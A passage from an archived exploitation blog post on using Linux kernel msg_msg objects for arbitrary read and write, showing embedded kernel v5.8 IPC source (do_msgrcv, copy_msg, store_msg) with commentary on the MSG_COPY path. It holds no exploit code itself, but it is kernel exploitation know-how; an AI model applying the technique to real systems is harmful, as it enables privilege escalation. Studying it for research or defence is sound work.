          <td id="file-do_msgrcv-c-LC123" class="blob-code blob-code-inner js-file-line"><span class="pl-c">         <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L124" class="blob-num js-line-number js-code-nav-line-number" data-line-number="124"></td>
          <td id="file-do_msgrcv-c-LC124" class="blob-code blob-code-inner js-file-line">        msg = <span class="pl-c1">READ_ONCE</span>(msr_d.<span class="pl-smi">r_msg</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L125" class="blob-num js-line-number js-code-nav-line-number" data-line-number="125"></td>
          <td id="file-do_msgrcv-c-LC125" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (msg != <span class="pl-c1">ERR_PTR</span>(-EAGAIN)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L126" class="blob-num js-line-number js-code-nav-line-number" data-line-number="126"></td>
          <td id="file-do_msgrcv-c-LC126" class="blob-code blob-code-inner js-file-line">            <span class="pl-c"><span class="pl-c">/*</span> see MSG_BARRIER for purpose/pairing <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L127" class="blob-num js-line-number js-code-nav-line-number" data-line-number="127"></td>
          <td id="file-do_msgrcv-c-LC127" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">smp_acquire__after_ctrl_dep</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L128" class="blob-num js-line-number js-code-nav-line-number" data-line-number="128"></td>
          <td id="file-do_msgrcv-c-LC128" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L129" class="blob-num js-line-number js-code-nav-line-number" data-line-number="129"></td>
          <td id="file-do_msgrcv-c-LC129" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock1;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L130" class="blob-num js-line-number js-code-nav-line-number" data-line-number="130"></td>
          <td id="file-do_msgrcv-c-LC130" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L131" class="blob-num js-line-number js-code-nav-line-number" data-line-number="131"></td>
          <td id="file-do_msgrcv-c-LC131" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L132" class="blob-num js-line-number js-code-nav-line-number" data-line-number="132"></td>
          <td id="file-do_msgrcv-c-LC132" class="blob-code blob-code-inner js-file-line">         <span class="pl-c"><span class="pl-c">/*</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L133" class="blob-num js-line-number js-code-nav-line-number" data-line-number="133"></td>
          <td id="file-do_msgrcv-c-LC133" class="blob-code blob-code-inner js-file-line"><span class="pl-c">          * ... or see -EAGAIN, acquire the lock to check the message</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L134" class="blob-num js-line-number js-code-nav-line-number" data-line-number="134"></td>
          <td id="file-do_msgrcv-c-LC134" class="blob-code blob-code-inner js-file-line"><span class="pl-c">          * again.</span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L135" class="blob-num js-line-number js-code-nav-line-number" data-line-number="135"></td>
          <td id="file-do_msgrcv-c-LC135" class="blob-code blob-code-inner js-file-line"><span class="pl-c">          <span class="pl-c">*/</span></span></td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L136" class="blob-num js-line-number js-code-nav-line-number" data-line-number="136"></td>
          <td id="file-do_msgrcv-c-LC136" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ipc_lock_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L137" class="blob-num js-line-number js-code-nav-line-number" data-line-number="137"></td>
          <td id="file-do_msgrcv-c-LC137" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L138" class="blob-num js-line-number js-code-nav-line-number" data-line-number="138"></td>
          <td id="file-do_msgrcv-c-LC138" class="blob-code blob-code-inner js-file-line">        msg = <span class="pl-c1">READ_ONCE</span>(msr_d.<span class="pl-smi">r_msg</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L139" class="blob-num js-line-number js-code-nav-line-number" data-line-number="139"></td>
          <td id="file-do_msgrcv-c-LC139" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (msg != <span class="pl-c1">ERR_PTR</span>(-EAGAIN))</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L140" class="blob-num js-line-number js-code-nav-line-number" data-line-number="140"></td>
          <td id="file-do_msgrcv-c-LC140" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L141" class="blob-num js-line-number js-code-nav-line-number" data-line-number="141"></td>
          <td id="file-do_msgrcv-c-LC141" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L142" class="blob-num js-line-number js-code-nav-line-number" data-line-number="142"></td>
          <td id="file-do_msgrcv-c-LC142" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">list_del</span>(&amp;msr_d.<span class="pl-smi">r_list</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L143" class="blob-num js-line-number js-code-nav-line-number" data-line-number="143"></td>
          <td id="file-do_msgrcv-c-LC143" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">signal_pending</span>(current)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L144" class="blob-num js-line-number js-code-nav-line-number" data-line-number="144"></td>
          <td id="file-do_msgrcv-c-LC144" class="blob-code blob-code-inner js-file-line">            msg = <span class="pl-c1">ERR_PTR</span>(-ERESTARTNOHAND);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L145" class="blob-num js-line-number js-code-nav-line-number" data-line-number="145"></td>
          <td id="file-do_msgrcv-c-LC145" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">goto</span> out_unlock0;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L146" class="blob-num js-line-number js-code-nav-line-number" data-line-number="146"></td>
          <td id="file-do_msgrcv-c-LC146" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L147" class="blob-num js-line-number js-code-nav-line-number" data-line-number="147"></td>
          <td id="file-do_msgrcv-c-LC147" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L148" class="blob-num js-line-number js-code-nav-line-number" data-line-number="148"></td>
          <td id="file-do_msgrcv-c-LC148" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">ipc_unlock_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L149" class="blob-num js-line-number js-code-nav-line-number" data-line-number="149"></td>
          <td id="file-do_msgrcv-c-LC149" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L150" class="blob-num js-line-number js-code-nav-line-number" data-line-number="150"></td>
          <td id="file-do_msgrcv-c-LC150" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L151" class="blob-num js-line-number js-code-nav-line-number" data-line-number="151"></td>
          <td id="file-do_msgrcv-c-LC151" class="blob-code blob-code-inner js-file-line">out_unlock0:</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L152" class="blob-num js-line-number js-code-nav-line-number" data-line-number="152"></td>
          <td id="file-do_msgrcv-c-LC152" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">ipc_unlock_object</span>(&amp;msq-&gt;<span class="pl-smi">q_perm</span>);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L153" class="blob-num js-line-number js-code-nav-line-number" data-line-number="153"></td>
          <td id="file-do_msgrcv-c-LC153" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">wake_up_q</span>(&amp;wake_q);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L154" class="blob-num js-line-number js-code-nav-line-number" data-line-number="154"></td>
          <td id="file-do_msgrcv-c-LC154" class="blob-code blob-code-inner js-file-line">out_unlock1:</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L155" class="blob-num js-line-number js-code-nav-line-number" data-line-number="155"></td>
          <td id="file-do_msgrcv-c-LC155" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">rcu_read_unlock</span>();</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L156" class="blob-num js-line-number js-code-nav-line-number" data-line-number="156"></td>
          <td id="file-do_msgrcv-c-LC156" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">IS_ERR</span>(msg)) {</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L157" class="blob-num js-line-number js-code-nav-line-number" data-line-number="157"></td>
          <td id="file-do_msgrcv-c-LC157" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">free_copy</span>(copy);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L158" class="blob-num js-line-number js-code-nav-line-number" data-line-number="158"></td>
          <td id="file-do_msgrcv-c-LC158" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-c1">PTR_ERR</span>(msg);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L159" class="blob-num js-line-number js-code-nav-line-number" data-line-number="159"></td>
          <td id="file-do_msgrcv-c-LC159" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L160" class="blob-num js-line-number js-code-nav-line-number" data-line-number="160"></td>
          <td id="file-do_msgrcv-c-LC160" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L161" class="blob-num js-line-number js-code-nav-line-number" data-line-number="161"></td>
          <td id="file-do_msgrcv-c-LC161" class="blob-code blob-code-inner js-file-line">    bufsz = <span class="pl-c1">msg_handler</span>(buf, msg, bufsz);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L162" class="blob-num js-line-number js-code-nav-line-number" data-line-number="162"></td>
          <td id="file-do_msgrcv-c-LC162" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">free_msg</span>(msg);</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L163" class="blob-num js-line-number js-code-nav-line-number" data-line-number="163"></td>
          <td id="file-do_msgrcv-c-LC163" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L164" class="blob-num js-line-number js-code-nav-line-number" data-line-number="164"></td>
          <td id="file-do_msgrcv-c-LC164" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> bufsz;</td>
        </tr>
        <tr>
          <td id="file-do_msgrcv-c-L165" class="blob-num js-line-number js-code-nav-line-number" data-line-number="165"></td>
          <td id="file-do_msgrcv-c-LC165" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/do_msgrcv.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-do_msgrcv-c">
          do_msgrcv.c
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div><div><br></div><div>If MSG_COPY flag is set (which is availble with CONFIG_CHECKPOINT_RESTORE), it calls prepare_copy, which is just a wrapper around load_msg to prepare a copy (interestingly enough, doesn't using that make it also usercopy whatever is in the userland buffer for recieving into the allocated copy first?). Without that flag, it simply traverses the queue and will unlink the msg after finding it with find_msg. Otherwise an unlink doesn't happen. <a href="https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L118">copy_msg</a> is called, and data is transferred to the copy via a memcpy (note the memcpy, this is very important!).</div><div><br></div><div><script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js(6).下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-copy_msg-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="copy_msg.c">
        <tbody><tr>
          <td id="file-copy_msg-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-copy_msg-c-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">ifdef</span> CONFIG_CHECKPOINT_RESTORE</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-copy_msg-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> msg_msg *<span class="pl-en">copy_msg</span>(<span class="pl-k">struct</span> msg_msg *src, <span class="pl-k">struct</span> msg_msg *dst)</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-copy_msg-c-LC3" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-copy_msg-c-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_msgseg *dst_pseg, *src_pseg;</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-copy_msg-c-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> len = src-&gt;<span class="pl-smi">m_ts</span>;</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-copy_msg-c-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> alen;</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-copy_msg-c-LC7" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-copy_msg-c-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (src-&gt;<span class="pl-smi">m_ts</span> &gt; dst-&gt;<span class="pl-smi">m_ts</span>)</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-copy_msg-c-LC9" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-c1">ERR_PTR</span>(-EINVAL);</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-copy_msg-c-LC10" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-copy_msg-c-LC11" class="blob-code blob-code-inner js-file-line">    alen = <span class="pl-c1">min</span>(len, DATALEN_MSG);</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-copy_msg-c-LC12" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(dst + <span class="pl-c1">1</span>, src + <span class="pl-c1">1</span>, alen);</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-copy_msg-c-LC13" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-copy_msg-c-LC14" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (dst_pseg = dst-&gt;<span class="pl-smi">next</span>, src_pseg = src-&gt;<span class="pl-smi">next</span>;</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-copy_msg-c-LC15" class="blob-code blob-code-inner js-file-line">         src_pseg != <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-copy_msg-c-LC16" class="blob-code blob-code-inner js-file-line">         dst_pseg = dst_pseg-&gt;<span class="pl-smi">next</span>, src_pseg = src_pseg-&gt;<span class="pl-smi">next</span>) {</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-copy_msg-c-LC17" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-copy_msg-c-LC18" class="blob-code blob-code-inner js-file-line">        len -= alen;</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L19" class="blob-num js-line-number js-code-nav-line-number" data-line-number="19"></td>
          <td id="file-copy_msg-c-LC19" class="blob-code blob-code-inner js-file-line">        alen = <span class="pl-c1">min</span>(len, DATALEN_SEG);</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L20" class="blob-num js-line-number js-code-nav-line-number" data-line-number="20"></td>
          <td id="file-copy_msg-c-LC20" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>(dst_pseg + <span class="pl-c1">1</span>, src_pseg + <span class="pl-c1">1</span>, alen);</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L21" class="blob-num js-line-number js-code-nav-line-number" data-line-number="21"></td>
          <td id="file-copy_msg-c-LC21" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L22" class="blob-num js-line-number js-code-nav-line-number" data-line-number="22"></td>
          <td id="file-copy_msg-c-LC22" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L23" class="blob-num js-line-number js-code-nav-line-number" data-line-number="23"></td>
          <td id="file-copy_msg-c-LC23" class="blob-code blob-code-inner js-file-line">    dst-&gt;<span class="pl-smi">m_type</span> = src-&gt;<span class="pl-smi">m_type</span>;</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L24" class="blob-num js-line-number js-code-nav-line-number" data-line-number="24"></td>
          <td id="file-copy_msg-c-LC24" class="blob-code blob-code-inner js-file-line">    dst-&gt;<span class="pl-smi">m_ts</span> = src-&gt;<span class="pl-smi">m_ts</span>;</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L25" class="blob-num js-line-number js-code-nav-line-number" data-line-number="25"></td>
          <td id="file-copy_msg-c-LC25" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L26" class="blob-num js-line-number js-code-nav-line-number" data-line-number="26"></td>
          <td id="file-copy_msg-c-LC26" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> dst;</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L27" class="blob-num js-line-number js-code-nav-line-number" data-line-number="27"></td>
          <td id="file-copy_msg-c-LC27" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L28" class="blob-num js-line-number js-code-nav-line-number" data-line-number="28"></td>
          <td id="file-copy_msg-c-LC28" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L29" class="blob-num js-line-number js-code-nav-line-number" data-line-number="29"></td>
          <td id="file-copy_msg-c-LC29" class="blob-code blob-code-inner js-file-line"><span class="pl-k">struct</span> msg_msg *<span class="pl-en">copy_msg</span>(<span class="pl-k">struct</span> msg_msg *src, <span class="pl-k">struct</span> msg_msg *dst)</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L30" class="blob-num js-line-number js-code-nav-line-number" data-line-number="30"></td>
          <td id="file-copy_msg-c-LC30" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L31" class="blob-num js-line-number js-code-nav-line-number" data-line-number="31"></td>
          <td id="file-copy_msg-c-LC31" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">ERR_PTR</span>(-ENOSYS);</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L32" class="blob-num js-line-number js-code-nav-line-number" data-line-number="32"></td>
          <td id="file-copy_msg-c-LC32" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-copy_msg-c-L33" class="blob-num js-line-number js-code-nav-line-number" data-line-number="33"></td>
          <td id="file-copy_msg-c-LC33" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">endif</span></td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/copy_msg.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-copy_msg-c">
          copy_msg.c
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div><div><br></div><div>If no errors have happened yet, it reaches the msg_handler call, which is actually do_msg_fill if you trace the code path from the call to do_msgrcv. <a href="https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1018">do_msg_fill</a> is basically a wrapper around&nbsp;

  
  
  
  

<a href="https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L150">store_msg</a>, which does the following:</div><div><br></div><div><script src="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/cf23c13d4a1d345b557a157740e191fe.js(7).下載"></script><link rel="stylesheet" href="./2021 - Utilizing msg_msg Objects for Arbitrary Read and Arbitrary Write in the Linux Kernel part 2_files/gist-embed-ff75a167df5efbfedb0e388793ca9fe7.css"><div id="gist111465757" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-store_msg-c" class="file my-2">
    
  <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

      
<div class="js-check-bidi blob-code-content">
  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="store_msg.c">
        <tbody><tr>
          <td id="file-store_msg-c-L1" class="blob-num js-line-number js-code-nav-line-number" data-line-number="1"></td>
          <td id="file-store_msg-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">store_msg</span>(<span class="pl-k">void</span> __user *dest, <span class="pl-k">struct</span> msg_msg *msg, <span class="pl-c1">size_t</span> len)</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L2" class="blob-num js-line-number js-code-nav-line-number" data-line-number="2"></td>
          <td id="file-store_msg-c-LC2" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L3" class="blob-num js-line-number js-code-nav-line-number" data-line-number="3"></td>
          <td id="file-store_msg-c-LC3" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">size_t</span> alen;</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L4" class="blob-num js-line-number js-code-nav-line-number" data-line-number="4"></td>
          <td id="file-store_msg-c-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> msg_msgseg *seg;</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L5" class="blob-num js-line-number js-code-nav-line-number" data-line-number="5"></td>
          <td id="file-store_msg-c-LC5" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L6" class="blob-num js-line-number js-code-nav-line-number" data-line-number="6"></td>
          <td id="file-store_msg-c-LC6" class="blob-code blob-code-inner js-file-line">    alen = <span class="pl-c1">min</span>(len, DATALEN_MSG);</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L7" class="blob-num js-line-number js-code-nav-line-number" data-line-number="7"></td>
          <td id="file-store_msg-c-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">copy_to_user</span>(dest, msg + <span class="pl-c1">1</span>, alen))</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L8" class="blob-num js-line-number js-code-nav-line-number" data-line-number="8"></td>
          <td id="file-store_msg-c-LC8" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L9" class="blob-num js-line-number js-code-nav-line-number" data-line-number="9"></td>
          <td id="file-store_msg-c-LC9" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L10" class="blob-num js-line-number js-code-nav-line-number" data-line-number="10"></td>
          <td id="file-store_msg-c-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (seg = msg-&gt;<span class="pl-smi">next</span>; seg != <span class="pl-c1">NULL</span>; seg = seg-&gt;<span class="pl-smi">next</span>) {</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L11" class="blob-num js-line-number js-code-nav-line-number" data-line-number="11"></td>
          <td id="file-store_msg-c-LC11" class="blob-code blob-code-inner js-file-line">        len -= alen;</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L12" class="blob-num js-line-number js-code-nav-line-number" data-line-number="12"></td>
          <td id="file-store_msg-c-LC12" class="blob-code blob-code-inner js-file-line">        dest = (<span class="pl-k">char</span> __user *)dest + alen;</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L13" class="blob-num js-line-number js-code-nav-line-number" data-line-number="13"></td>
          <td id="file-store_msg-c-LC13" class="blob-code blob-code-inner js-file-line">        alen = <span class="pl-c1">min</span>(len, DATALEN_SEG);</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L14" class="blob-num js-line-number js-code-nav-line-number" data-line-number="14"></td>
          <td id="file-store_msg-c-LC14" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">copy_to_user</span>(dest, seg + <span class="pl-c1">1</span>, alen))</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L15" class="blob-num js-line-number js-code-nav-line-number" data-line-number="15"></td>
          <td id="file-store_msg-c-LC15" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> -<span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L16" class="blob-num js-line-number js-code-nav-line-number" data-line-number="16"></td>
          <td id="file-store_msg-c-LC16" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L17" class="blob-num js-line-number js-code-nav-line-number" data-line-number="17"></td>
          <td id="file-store_msg-c-LC17" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-store_msg-c-L18" class="blob-num js-line-number js-code-nav-line-number" data-line-number="18"></td>
          <td id="file-store_msg-c-LC18" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe/raw/22c9c8f0ec44a889d72d7a62674449085cfacdf6/store_msg.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/BitsByWill/cf23c13d4a1d345b557a157740e191fe#file-store_msg-c">
          store_msg.c
        </a>
        hosted with ❤ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
